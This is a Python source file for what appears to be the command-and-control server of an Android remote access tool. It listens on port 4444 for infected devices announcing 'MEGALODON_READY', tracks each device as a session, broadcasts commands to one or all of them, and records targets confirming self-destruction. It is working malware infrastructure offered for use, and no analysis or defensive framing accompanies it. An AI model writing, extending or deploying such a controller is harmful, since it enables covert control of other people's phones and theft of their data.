import socket
import struct
import threading
import time
from datetime import datetime
from pathlib import Path
import json


def write_utf(sock, text):
    """Mimics Java DataOutputStream.writeUTF (modified UTF-8 with 2-byte length)."""
    data = text.encode('utf-8')
    length = len(data)
    sock.sendall(struct.pack('>H', length))
    sock.sendall(data)


def read_utf(sock):
    """Mimics Java DataInputStream.readUTF. Returns None on EOF."""
    header = recv_exact(sock, 2)
    if header is None:
        return None
    length = struct.unpack('>H', header)[0]
    if length == 0:
        return ''
    data = recv_exact(sock, length)
    if data is None:
        return None
    return data.decode('utf-8', errors='replace')


def recv_exact(sock, n):
    """Read exactly n bytes or return None on EOF."""
    buf = b''
    while len(buf) < n:
        try:
            chunk = sock.recv(n - len(buf))
        except Exception:
            return None
        if not chunk:
            return None
        buf += chunk
    return buf


class Listener:

    def __init__(self, ip='0.0.0.0', port=4444):
        self.ip = ip
        self.port = port
        self.socket = None
        self.running = False
        self.clients = []
        self.sessions_file = Path('data/sessions/active.json')
        self.sessions_file.parent.mkdir(parents=True, exist_ok=True)

    def start(self):
        self.running = True
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.ip, self.port))
        self.socket.listen(10)

        print(f"[+] Listener started on {self.ip}:{self.port}")
        print(f"[+] Waiting for connections...")

        while self.running:
            try:
                client, address = self.socket.accept()
                client.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                print(f"[+] New connection from {address[0]}:{address[1]}")

                client_handler = threading.Thread(
                    target=self.handle_client, args=(client, address), daemon=True
                )
                client_handler.start()

            except Exception as e:
                if self.running:
                    print(f"[-] Listener error: {e}")

    def handle_client(self, client, address):
        session_id = f"session_{int(time.time())}"

        session_data = {
            'id': session_id,
            'ip': address[0],
            'port': address[1],
            'connected': datetime.now().isoformat(),
            'last_activity': datetime.now().isoformat(),
            'commands': 0,
            'status': 'active'
        }

        client_entry = {
            'socket': client,
            'address': address,
            'session': session_data
        }
        self.clients.append(client_entry)
        self.save_session(session_data)

        try:
            # First message from APK: "MEGALODON_READY"
            hello = read_utf(client)
            if hello is None:
                print(f"[-] Client disconnected before handshake")
                return

            print(f"[+] Handshake: {hello}")
            session_data['status'] = 'ready'
            self.save_session(session_data)

            # Keep reading commands from APK
            while self.running:
                data = read_utf(client)
                if data is None:
                    break

                session_data['last_activity'] = datetime.now().isoformat()
                session_data['commands'] += 1
                self.save_session(session_data)

                print(f"[<] {data}")

                if data == "___END___":
                    continue

                if data == "SELF_DESTRUCT_CONFIRM":
                    print(f"[+] Target {address[0]} confirmed self-destruct")
                    session_data['status'] = 'destroyed'
                    self.save_session(session_data)
                    break

        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            try:
                client.close()
            except Exception:
                pass
            session_data['status'] = 'closed'
            self.save_session(session_data)
            self.clients = [c for c in self.clients if c['socket'] != client]
            print(f"[-] Connection closed: {address[0]}")

    def send_to_session(self, session_id, command):
        """Send a command to a specific session."""
        for c in self.clients:
            if c['session']['id'] == session_id:
                try:
                    write_utf(c['socket'], command)
                    return True
                except Exception as e:
                    print(f"[-] Send failed: {e}")
                    return False
        return False

    def send_to_all(self, command):
        """Send a command to every connected APK."""
        sent = 0
        for c in list(self.clients):
            try:
                write_utf(c['socket'], command)
                sent += 1
            except Exception as e:
                print(f"[-] Send failed to {c['address'][0]}: {e}")
        return sent

    def save_session(self, session_data):
        try:
            sessions = []
            if self.sessions_file.exists():
                with open(self.sessions_file, 'r') as f:
                    sessions = json.load(f)

            for i, s in enumerate(sessions):
                if s['id'] == session_data['id']:
                    sessions[i] = session_data
                    break
            else:
                sessions.append(session_data)

            with open(self.sessions_file, 'w') as f:
                json.dump(sessions, f, indent=2)

        except Exception as e:
            print(f"[-] Failed to save session: {e}")

    def stop(self):
        self.running = False
        for c in list(self.clients):
            try:
                c['socket'].close()
            except Exception:
                pass
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass
        print("[+] Listener stopped")

    def list_sessions(self):
        return self.clients
